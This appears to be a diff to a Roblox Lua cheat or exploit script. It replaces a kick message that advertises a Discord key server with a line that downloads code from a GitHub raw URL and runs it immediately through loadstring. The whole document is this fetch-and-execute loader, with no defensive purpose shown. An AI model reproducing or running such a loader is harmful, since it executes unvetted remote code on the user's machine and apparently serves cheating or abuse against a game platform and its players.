@@ -1,1 +1,1 @@
- game.Players.LocalPlayer:Kick("Script Update Key Discord.gg/zpshub")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zeroscgaming/WL/main/KeyV2"))()
